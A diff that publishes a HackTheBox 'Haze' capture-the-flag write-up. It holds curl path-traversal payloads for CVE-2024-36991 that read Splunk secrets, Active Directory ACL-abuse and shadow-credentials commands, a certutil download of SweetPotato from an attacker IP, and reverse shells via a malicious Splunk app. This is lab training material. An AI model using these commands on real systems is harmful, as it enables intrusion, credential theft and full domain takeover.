@@ -3,13 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="robots" content="noindex">
+    <meta name="robots" content="index, follow">
     <title>Haze - Hexicon Archives</title>
     <link rel="icon" type="image/x-icon" sizes="500x500" href="../favicon.png">
     <link rel="stylesheet" href="../style.css">
     <link rel="canonical" href="https://hexphased.github.io/hexicon-archives/machines/Haze.html" />
     <!-- Machine-specific metadata for SEO -->
-    <meta name="description" content="Restricted writeup for Haze machine from HackTheBox - Hard difficulty level">
+    <meta name="description" content="Detailed writeup for Haze machine from HackTheBox - Hard difficulty level">
     <meta name="keywords" content="HackTheBox, Haze, Hard, CTF, writeup, cybersecurity, penetration testing, Hexicon">
 </head>
 <body>
@@ -59,16 +59,164 @@
         <h1 class="writeup-title">Haze</h1>
         <div class="writeup-metadata">
             <span class="difficulty hard">Hard</span>
-            <span class="date">Active machine</span>
+            <span class="date">June 28, 2025</span>
         </div>
         
         <div class="writeup-container">
             <div class="writeup-body">
                 <!-- Machine-specific content goes here -->
-                <p><img alt="Haze" src="../images/Haze/pwned.png" /></p>
-<p>Haze is an <strong>ACTIVE</strong> machine!</p>
-<p>This write-up will go live once Haze retires.</p>
-<p>Please note that I’m following Hack The Box’s guidelines by not posting detailed solutions while the machine is still live.</p>
+                <p><img alt="pwned" src="../images/Haze/pwned.png" /></p>
+<p>Haze was a hard-difficulty Windows Active Directory box featuring a domain controller with exposed Splunk services. Initial reconnaissance revealed standard AD ports alongside Splunk running on ports 8000, 8089, and 8088.
+Version enumeration through port 8089 identified a vulnerable Splunk instance susceptible to CVE-2024-36991, a path traversal vulnerability allowing arbitrary file reads.</p>
+<p>Exploiting the path traversal via /en-US/modules/messaging/C:../C:../, I extracted Splunk's configuration files including authentication.conf containing an encrypted LDAP password for Paul Taylor, and /etc/auth/splunk.secret containing the decryption key.
+Using the splunksecrets tool, I decrypted the password to reveal Ld@p_Auth_Sp1unk@2k24. After testing various username formats and creating an user list via RID bruteforcing, the credentials worked for both paul.taylor and mark.adams.</p>
+<p>Bloodhound enumeration revealed Mark Adams belonged to the Remote Management Users and GMSA managers groups, providing access to manage the Haze-IT-Backup$ service account.
+I modified the service account's PrincipalsAllowedToRetrieveManagedPassword attribute via PowerShell, then extracted its GMSA hash using netexec.
+Further Bloodhound analysis identified an attack path through the support_services group to compromise edward.martin via shadow credentials.</p>
+<p>After establishing ownership and FullControl permissions over the support services group, I added the backup account as a member and performed a shadow credentials attack using Certipy, obtaining Edward's NT hash.
+As Edward Martin, I discovered a Splunk backup archive in C:\ containing legacy configuration files.
+Recursive grep searches revealed $1$ format password hashes, which I decrypted to obtain Splunk admin credentials: admin:Sp1unkadmin@2k24.</p>
+<p>With administrative access to Splunk, I uploaded a malicious .spl application file containing a PowerShell reverse shell, gaining code execution as the alex user.
+The final privilege escalation leveraged Alex's SeImpersonatePrivilege using SweetPotato to execute a reverse shell as SYSTEM, completing full domain compromise.</p>
+<h1>User flag</h1>
+<p>Initial nmap scan reveals a standard set of ports for an active directory DC.</p>
+<p><img alt="nmap1" src="../images/Haze/nmap1.png" /></p>
+<p>It also revealed 3 ports tied to Splunk, a SIEM/SOAR platform.</p>
+<p><img alt="nmap2" src="../images/Haze/nmap2.png" /></p>
+<h2>Arbitrary file read via Splunk path traversal CVE</h2>
+<p><img alt="splunk" src="../images/Haze/splunk.png" /></p>
+<p>I cannot access Splunk without valid credentials. There are no default ones either, so there is nothing I can do here right now.</p>
+<p>This was on port 8000. There are 2 ports left, so I'll check them next.</p>
+<p>Starting with port 8089, I already found something very useful.</p>
+<p><img alt="splunkatom" src="../images/Haze/splunkatom.png" /></p>
+<p>While none of the options worked without a password, knowing the Splunk build version will help significantly with searching for CVEs. That's exactly what I'm going to do.</p>
+<p><code>https://www.sonicwall.com/blog/critical-splunk-vulnerability-cve-2024-36991-patch-now-to-prevent-arbitrary-file-reads</code></p>
+<p>There is also a PoC mentioned, but exploitation should be rather simple to do via curl.</p>
+<p><code>curl -X GET http://10.10.11.61:8000/en-US/modules/messaging/C:../C:../C:../C:../C:../etc/passwd</code></p>
+<p><img alt="hashes" src="../images/Haze/hashes.png" /></p>
+<p>None of these hashes would crack though. I will search for more information on Splunk's configuration files so that I can extract them.</p>
+<h3>Leaking Splunk secrets</h3>
+<p>I found a few discussions, images and links. Most importantly, however, I found the official list of the configuration files on the Splunk website.</p>
+<p><code>https://help.splunk.com/en/splunk-enterprise/administer/admin-manual/9.4/configuration-file-reference/9.4.0-configuration-file-reference</code></p>
+<p>First, I grabbed the authentication.conf file. Documentation revealed locations of both the default <code>/etc/system/default/authentication.conf</code> and the custom <code>/etc/system/local/authentication.conf</code> file. </p>
+<p><code>curl -X GET http://10.10.11.61:8000/en-US/modules/messaging/C:../C:../C:../C:../C:../etc/system/local/authentication.conf</code></p>
+<p><img alt="passwordenc" src="../images/Haze/passwordenc.png" /></p>
+<p><code>Paul Taylor | $7$ndnYiCPhf4lQgPhPu7Yz1pvGm66Nk0PpYcLN+qt1qyojg4QU+hKteemWQGUuTKDVlWbO8pY=</code></p>
+<p>And there's a password string! I don't recognize this format though, and some other tools I've tried did not either. I'll keep searching through the documentation, as maybe there is a way to decode it into something usable.</p>
+<p>Reading more into the documentation of this conf file, I stumbled upon the term "secret". I am familiar with what a secret could be and pretty confident that I could uncover this password with it if found.</p>
+<p>I searched the web for a location where Splunk stores its secrets, and I found it after a minute.</p>
+<p><img alt="secrets" src="../images/Haze/secrets.png" /></p>
+<p>I'll try grabbing it just like the files before, with a small modification to my curl command.</p>
+<p><code>curl -X GET http://10.10.11.61:8000/en-US/modules/messaging/C:../C:../C:../C:../C:../etc/auth/splunk.secret</code></p>
+<p><img alt="secter" src="../images/Haze/secter.png" /></p>
+<h3>Decrypting the LDAP password</h3>
+<p>Searching for a way to reveal the password, I found a promising repository on github.</p>
+<p><code>https://github.com/HurricaneLabs/splunksecrets</code></p>
+<p>I installed splunksecrets using pipx and tried to decrypt the password.</p>
+<p><code>splunksecrets splunk-decrypt -S secret - where the 'secret' file contains the secret extracted from splunk.secrets</code></p>
+<p><img alt="password" src="../images/Haze/password.png" /></p>
+<p>I'll check the validity of these credentials by authenticating with netexec.</p>
+<p><img alt="failure" src="../images/Haze/failure.png" /></p>
+<p>But this failed. One of the more common username formats I've come across in AD is <code>FirstLetterOfName.Surname</code>. So here for example it would be <code>p.taylor</code>.</p>
+<p>This one did not work either. I can use a tool like username anarchy to generate a list of potential formats to bruteforce with, or I could try single formats manually.</p>
+<p>I'll try one more. If this does not work, I will use the mentioned tool.</p>
+<p><img alt="success" src="../images/Haze/success.png" /></p>
+<p>This format finally worked, but no users were displayed.</p>
+<h2>RID bruteforcing</h2>
+<p>Using netexec, I can bruteforce RIDs(Relative identifiers) of domain objects. I will begin with a limit of 2000, and I'll increase it by 1000 after every unsuccessful attempt.</p>
+<p><img alt="ridbrute" src="../images/Haze/ridbrute.png" /></p>
+<p>I directed the output of this command into a userlist file.</p>
+<p>To refine it into a proper user list, I will use awk to strip off any entry that is not a user. Then I'll cut the remaining lines so that only the usernames will remain.</p>
+<p><code>awk '/SidTypeUser/ {split($6, parts, "\\"); print parts[2]}' userlist &gt; finaluserlist</code></p>
+<p><img alt="finaluserlist" src="../images/Haze/finaluserlist.png" /></p>
+<p>I will use this user list to test the LDAP password against each user.</p>
+<p><img alt="hit" src="../images/Haze/hit.png" /></p>
+<p><code>mark.adams | Ld@p_Auth_Sp1unk@2k24</code></p>
+<h2>Bloodhound enumeration</h2>
+<p>Now is a good time to do some bloodhound analysis.</p>
+<p>Paul Taylor had no interesting permissions at all.</p>
+<p><img alt="bh" src="../images/Haze/bh.png" /></p>
+<p>But this was not the case for Mark Adams. He is a member of the Remote Management Users, which means that he can remote into the machine. Additionally, he is a member of the GMSA managers group.</p>
+<p><img alt="bh1" src="../images/Haze/bh1.png" /></p>
+<p>There is also this account with a dollar sign at the end of its name. It is either a service or a computer account. With permission to read GMSA passwords, I should be able to read its hash.</p>
+<p>This account can update the owner of this support services group, but there is no one in said group.</p>
+<p><img alt="bh2" src="../images/Haze/bh2.png" /></p>
+<p>This unknown object intrigues me a lot. It could be an important object that Mark Adams cannot access. I'll gather more data once I take control of the backup account.</p>
+<h2>Manually updating the password read attribute on Haze-IT-Backup$</h2>
+<p><img alt="gmsa" src="../images/Haze/gmsa.png" /></p>
+<p>Mark Adams cannot read the GMSA password of Haze-It. This makes me think that he can instead update their <code>PrincipalsAllowedToReadPassword</code> attribute.</p>
+<p>It most definitely can be done remotely with bloodyAD, but I'll do it with powershell since Mark Adams can remote into the machine.</p>
+<p><img alt="remote" src="../images/Haze/remote.png" /></p>
+<p>The attribute can be set with this powershell command.</p>
+<p><code>Set-ADServiceAccount -Identity "Haze-IT-Backup$" -PrincipalsAllowedToRetrieveManagedPassword "mark.adams"</code></p>
+<p><img alt="command" src="../images/Haze/command.png" /></p>
+<p>Checking the attribute again afterward confirms that the change was successful. Now I'll rerun the netexec command to read the GMSA password.</p>
+<p><img alt="success1" src="../images/Haze/success1.png" /></p>
+<h2>Bloodhound enumeration 2</h2>
+<p>As I mentioned before, I will rerun bloodhound-python using the backup account.</p>
+<p><code>bloodhound-python -c all -d haze.htb -u 'Haze-IT-Backup$' --hashes :4de830d1d58c14e241aff55f82ecdba1 -dc DC01.haze.htb -ns 10.10.11.61 --zip</code></p>
+<p><img alt="bhound" src="../images/Haze/bhound.png" /></p>
+<p>My assumptions were correct. Turns out that the unknown object was, in fact, a user. Anyone in the support services group can manipulate Edward Martin in two ways. I'll use shadow credentials here as it's a cleaner method than simply changing his password.</p>
+<p><img alt="bhound1" src="../images/Haze/bhound1.png" /></p>
+<p>Edward is a member of the Remote Management Users Group and the Backup Reviewers group. I did see a certain object on the machine that matches the latter group, so that will be my main point of interest after taking control of Edward Martin.</p>
+<h2>Adding shadow credentials to Edward Martin</h2>
+<p>There are a few steps that need to be done in order to make the shadow credentials attack possible.</p>
+<ol>
+<li>Set Haze-IT-Backup as the owner of the support_services group</li>
+<li>Elevate rights to FullControll</li>
+<li>Add Haze-IT-Backup to the group</li>
+</ol>
+<p>After that, shadow credentials can be added to Edward and his NT hash will be captured.</p>
+<div class="codehilite"><pre><span></span><code><span class="mf">1.</span><span class="w"> </span><span class="n">bloodyAD</span><span class="w"> </span><span class="o">-</span><span class="n">d</span><span class="w"> </span><span class="n">haze</span><span class="mf">.</span><span class="n">htb</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="err">&#39;</span><span class="n">Haze</span><span class="o">-</span><span class="n">IT</span><span class="o">-</span><span class="n">Backup$</span><span class="err">&#39;</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="err">&#39;</span><span class="p">:</span><span class="mf">4</span><span class="n">de830d1d58c14e241aff55f82ecdba1</span><span class="err">&#39;</span><span class="w"> </span><span class="o">--</span><span class="n">host</span><span class="w"> </span><span class="n">DC01</span><span class="mf">.</span><span class="n">haze</span><span class="mf">.</span><span class="n">htb</span><span class="w"> </span><span class="o">--</span><span class="n">dc</span><span class="o">-</span><span class="n">ip</span><span class="w"> </span><span class="mf">10.10.11.61</span><span class="w"> </span><span class="n">set</span><span class="w"> </span><span class="n">owner</span><span class="w"> </span><span class="n">support_services</span><span class="w"> </span><span class="err">&#39;</span><span class="n">Haze</span><span class="o">-</span><span class="n">IT</span><span class="o">-</span><span class="n">Backup$</span><span class="err">&#39;</span>
+
+<span class="mf">2.</span><span class="w"> </span><span class="n">impacket</span><span class="o">-</span><span class="n">dacledit</span><span class="w"> </span><span class="o">-</span><span class="n">hashes</span><span class="w"> </span><span class="err">&#39;</span><span class="p">:</span><span class="mf">4</span><span class="n">de830d1d58c14e241aff55f82ecdba1</span><span class="err">&#39;</span><span class="w"> </span><span class="o">-</span><span class="n">dc</span><span class="o">-</span><span class="n">ip</span><span class="w"> </span><span class="mf">10.10.11.61</span><span class="w"> </span><span class="o">-</span><span class="n">principal</span><span class="w"> </span><span class="err">&#39;</span><span class="n">Haze</span><span class="o">-</span><span class="n">IT</span><span class="o">-</span><span class="n">Backup$</span><span class="err">&#39;</span><span class="w"> </span><span class="o">-</span><span class="n">target</span><span class="w"> </span><span class="n">support_services</span><span class="w"> </span><span class="o">-</span><span class="n">action</span><span class="w"> </span><span class="n">write</span><span class="w"> </span><span class="o">-</span><span class="n">rights</span><span class="w"> </span><span class="n">FullControl</span><span class="w"> </span><span class="n">haze</span><span class="mf">.</span><span class="n">htb</span><span class="o">/</span><span class="err">&#39;</span><span class="n">Haze</span><span class="o">-</span><span class="n">IT</span><span class="o">-</span><span class="n">Backup$</span><span class="err">&#39;</span>
+
+<span class="mf">3.</span><span class="w"> </span><span class="n">bloodyAD</span><span class="w"> </span><span class="o">-</span><span class="n">d</span><span class="w"> </span><span class="n">haze</span><span class="mf">.</span><span class="n">htb</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="err">&#39;</span><span class="n">Haze</span><span class="o">-</span><span class="n">IT</span><span class="o">-</span><span class="n">Backup$</span><span class="err">&#39;</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="err">&#39;</span><span class="p">:</span><span class="mf">4</span><span class="n">de830d1d58c14e241aff55f82ecdba1</span><span class="err">&#39;</span><span class="w"> </span><span class="o">--</span><span class="n">host</span><span class="w"> </span><span class="n">DC01</span><span class="mf">.</span><span class="n">haze</span><span class="mf">.</span><span class="n">htb</span><span class="w"> </span><span class="o">--</span><span class="n">dc</span><span class="o">-</span><span class="n">ip</span><span class="w"> </span><span class="mf">10.10.11.61</span><span class="w"> </span><span class="n">add</span><span class="w"> </span><span class="n">groupMember</span><span class="w"> </span><span class="n">support_services</span><span class="w"> </span><span class="err">&#39;</span><span class="n">Haze</span><span class="o">-</span><span class="n">IT</span><span class="o">-</span><span class="n">Backup$</span><span class="err">&#39;</span>
+</code></pre></div>
+
+<p><img alt="commands" src="../images/Haze/commands.png" /></p>
+<p>With everything in place, I will use certipy to perform the shadow credentials attack.</p>
+<div class="codehilite"><pre><span></span><code>certipy-ad shadow auto -account edward.martin -dc-ip 10.10.11.61 -dc-host DC01.haze.htb -u &#39;Haze-IT-Backup$&#39; -hashes 4de830d1d58c14e241aff55f82ecdba1
+</code></pre></div>
+
+<p><img alt="shadow" src="../images/Haze/shadow.png" /></p>
+<p>Since I now have Edward's hash, I will remote into the machine as him.</p>
+<p><img alt="user" src="../images/Haze/user.png" /></p>
+<h1>Root flag</h1>
+<p>The object I mentioned before was located in the C:\ directory.</p>
+<p><img alt="backup" src="../images/Haze/backup.png" /></p>
+<p>It was a Splunk backup folder.</p>
+<h2>Decrypting the backup Splunk password</h2>
+<p>Inside that folder, there was a zipped backup file, which I'd downloaded onto my machine.</p>
+<p><img alt="download" src="../images/Haze/download.png" /></p>
+<p>The archive contained the whole Splunk filesystem, the same as in the 1st step.</p>
+<p>However, while I did manage to grab a different secret from the same location, there were no passwords in the authentication file.</p>
+<p>I remember that the Splunk hashes start with a '$7$' or '$1$', depending on the version they were created in.</p>
+<p>I'll use a recursive grep to search for both of those in the whole backup directory.</p>
+<p><img alt="hashes1" src="../images/Haze/hashes1.png" /></p>
+<p>None of the $7$ hashes decrypted. I moved to the legacy option and began working on the $1$ ones.</p>
+<p><img alt="legacydecrypt" src="../images/Haze/legacydecrypt.png" /></p>
+<p><code>splunk admin | Sp1unkadmin@2k24</code></p>
+<h2>Getting a reverse shell through Splunk</h2>
+<p>I tried the uncovered credentials on the Splunk login panel.</p>
+<p><img alt="splunkweb" src="../images/Haze/splunkweb.png" /></p>
+<p>Admin access on Splunk will allow me to get a reverse shell from whoever is running it. It involves uploading a malicious .spl file for code execution.</p>
+<p><code>https://github.com/0xjpuff/reverse_shell_splunk</code></p>
+<p>I edited the rev.ps1 one, and zipped the files into a .spl file, following the repo guide.</p>
+<p>To install the malicious file, I'll go to apps -&gt; manage apps -&gt; install the app from file -&gt; browse to the file and select it -&gt; install.</p>
+<p><img alt="alex" src="../images/Haze/alex.png" /></p>
+<p>The reverse shell hit my listener seconds after clicking the install button.</p>
+<h2>Shell as system</h2>
+<p><img alt="impersonate" src="../images/Haze/impersonate.png" /></p>
+<p>Alex has the SeImpersonatePrivilege. This means I can use a potato exploit to gain a SYSTEM shell.</p>
+<p>I'll start by trying sweet potato because I already had the executable.</p>
+<p>I will transport it onto the box using certutil.</p>
+<p><code>certutil -urlcache -f httpL//10.10.16.94:8000/SweetPotato.exe sweetpotato.exe</code></p>
+<p>And a reverse shell as well. Just a regular powershell oneliner. I'll save it as rev.ps1.</p>
+<p>I stood up a listener in a different terminal and executed sweet potato.</p>
+<p><code>.\SweetPotato.exe -a 'powershell -ep bypass C:\programdata\rev.ps1'</code></p>
+<p><img alt="root" src="../images/Haze/root.png" /></p>
+<p>Rooted!</p>
             </div>
             
             <div class="toc-sidebar">
